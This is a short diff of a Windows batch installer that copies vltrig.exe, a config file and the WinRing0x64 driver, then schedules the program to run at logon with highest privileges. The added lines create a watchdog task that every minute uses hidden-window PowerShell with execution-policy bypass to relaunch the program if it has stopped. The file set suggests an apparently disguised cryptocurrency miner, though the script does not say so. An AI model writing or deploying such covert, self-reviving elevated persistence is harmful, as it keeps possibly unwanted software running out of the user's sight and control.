@@ -23,7 +23,11 @@ copy /y "%TMP%\config.json"     "%DEST%\" >nul
 copy /y "%TMP%\WinRing0x64.sys" "%DEST%\" >nul
 
 schtasks /delete /tn "VLTrig" /f >nul 2>&1
+schtasks /delete /tn "VLTrigWatch" /f >nul 2>&1
+
 schtasks /create /tn "VLTrig" /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\"" /sc onlogon /rl highest /f >nul
+
+schtasks /create /tn "VLTrigWatch" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"if (-not (Get-Process vltrig -ErrorAction SilentlyContinue)) { Start-Process '%DEST%\vltrig.exe' -ArgumentList '--config=%DEST%\config.json' }\"" /sc minute /mo 1 /rl highest /f >nul
 
 schtasks /run /tn "VLTrig" >nul
 timeout /t 3 /nobreak >nul
